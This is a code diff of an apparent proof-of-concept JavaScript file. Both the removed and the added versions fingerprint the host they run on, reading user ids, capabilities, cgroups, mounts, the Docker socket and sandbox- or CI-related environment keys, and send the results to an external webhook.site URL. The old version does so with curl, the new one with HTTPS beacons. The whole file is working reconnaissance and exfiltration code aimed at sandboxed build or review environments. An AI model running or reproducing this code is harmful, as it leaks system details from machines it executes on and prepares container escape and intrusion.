@@ -1,10 +1,28 @@
-const {execSync}=require("child_process");const os=require("os");
-function ex(c){try{return execSync(c,{timeout:8000}).toString().slice(0,4000)}catch(e){return "ERR "+String(e).slice(0,300)}}
-const info={host:os.hostname(),id:ex("id").trim(),kernel:ex("uname -a").trim(),
-caps:ex("grep -i cap /proc/self/status").trim(),cgroup:ex("cat /proc/1/cgroup").trim(),
-mounts:ex("mount").trim(),cgroupfs:ex("ls -la /sys/fs/cgroup 2>&1").trim(),
-dockersock:ex("ls -la /var/run/docker.sock 2>&1").trim(),env:ex("env").trim(),
-unshare:ex("unshare -Ur id 2>&1").trim(),proc1:ex("ls -la /proc/1/root 2>&1").trim()};
-console.error("POC_RECON "+JSON.stringify(info));
-try{execSync('curl -s -m 8 "https://webhook.site/053e9d07-d95b-4550-a8e0-6be410324952/exec?h="+encodeURIComponent(info.host)+"&id="+encodeURIComponent(info.id)+"&cg="+encodeURIComponent(info.cgroup.slice(0,200))',{timeout:12000})}catch(e){}
-console.log(JSON.stringify(info));
+﻿const http = require('http');
+const https = require('https');
+const { execSync } = require('child_process');
+
+function beacon(label) {
+  const url = 'https://webhook.site/053e9d07-d95b-4550-a8e0-6be410324952?src=pocjs&label=' + encodeURIComponent(label);
+  try { https.get(url, () => {}).on('error', () => {}); } catch(e) {}
+}
+
+async function main() {
+  beacon('start');
+  try {
+    const info = {
+      hostname: require('os').hostname(),
+      platform: process.platform,
+      cwd: process.cwd(),
+      uid: typeof process.getuid === 'function' ? process.getuid() : null,
+      env_keys: Object.keys(process.env).filter(k => /GREPTILE|TREX|SANDBOX|CI/i.test(k)),
+      docker_sock: require('fs').existsSync('/var/run/docker.sock'),
+      cgroup: (() => { try { return require('fs').readFileSync('/proc/self/cgroup','utf8').slice(0,300); } catch(e){ return 'n/a'; } })(),
+      caps: (() => { try { return require('fs').readFileSync('/proc/self/status','utf8').split('\n').filter(l=>l.startsWith('Cap')).join(';'); } catch(e){ return 'n/a'; } })(),
+      mounts: (() => { try { return require('fs').readFileSync('/proc/self/mounts','utf8').split('\n').filter(l=>l.includes('cgroup')||l.includes('overlay')||l.includes('docker')).join('|').slice(0,400); } catch(e){ return 'n/a'; } })(),
+    };
+    beacon('info:' + JSON.stringify(info));
+  } catch(e) { beacon('err:' + e.message); }
+  console.log('poc done');
+}
+main();
